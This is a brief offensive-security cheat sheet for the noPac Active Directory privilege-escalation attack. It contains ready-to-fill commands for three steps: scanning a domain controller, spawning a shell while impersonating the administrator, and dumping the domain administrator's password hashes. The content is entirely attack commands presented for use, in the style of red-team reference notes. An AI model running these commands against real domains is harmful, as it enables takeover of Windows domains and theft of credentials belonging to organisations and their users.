# Nopac

## NoPac

### NoPac scan

Scan scan with Nopac.

```sh title:"Nopac Scan Scan"
python3 scanner.py $domain/$user:$pass -dc-ip $rhost_ip -use-ldap
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
-->

### NoPac shell

Spawn shell with Nopac.

```sh title:"Nopac Spawn Shell"
python3 nopac.py $domain/$user:$pass -dc-ip $rhost_ip -dc-host $rhost_name -shell --impersonate administrator -use-ldap
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var rhost_name
-->

### NoPac dump hashes

Dump hashes with Nopac.

```sh title:"Nopac Dump Hashes"
python3 nopac.py $domain/$user:$pass -dc-ip $rhost_ip -dc-host $rhost_name --dump-hashes -use-ldap --impersonate administrator -use-ldap -dump -just-dc-user $domain/administrator
```
<!-- cheat
var domain
var user
var pass
var rhost_ip
var rhost_name
-->

